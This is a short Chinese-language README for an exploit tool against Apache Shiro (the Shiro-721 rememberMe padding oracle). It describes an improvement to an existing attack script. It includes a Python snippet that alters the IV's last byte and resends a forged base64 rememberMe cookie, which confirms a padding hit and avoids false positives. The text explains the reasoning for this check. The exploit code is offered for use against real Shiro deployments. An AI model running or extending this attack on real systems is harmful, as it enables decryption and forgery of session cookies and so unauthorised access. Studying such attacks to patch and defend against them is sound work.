# shiro_padding_oracle

这个exp是基于[Shiro-721](https://github.com/inspiringz/Shiro-721)中的shiro_oracle_padding.py加了一点优化。

添加的代码是padding函数中的这一段
```python
# check the exception 
if j != 16:
    tmp_bytearray = bytearray(head_IV)
    tmp_bytearray[-1] += 1
    IV = tmp_bytearray.decode('latin1').encode('latin1') + chr(i).encode('latin1') + back_IV
    enc = encryption + IV + temp_ciphertext
    remeberme = base64.b64encode(enc)
    res2 = shiro_request(remeberme.decode('latin1'))
```

比如在枚举iv第一位的时候，我们并不知道反馈padding成功是`0x01`还是`0x02 0x02`，所以这个时候需要把iv的前一位改掉，再跑一遍，如果还是反馈成功，那就证明没问题。
